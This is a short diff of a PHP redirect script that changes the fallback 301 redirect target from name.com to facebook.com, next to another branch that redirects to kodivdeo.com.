@@ -10,7 +10,7 @@ header("Location: http://kodivdeo.com/");
     }
 else {
 header("HTTP/1.1 301 Moved Permanently");
-header("Location: https://www.name.com/");
+header("Location: https://www.facebook.com/");
 die(); exit();
 }
 
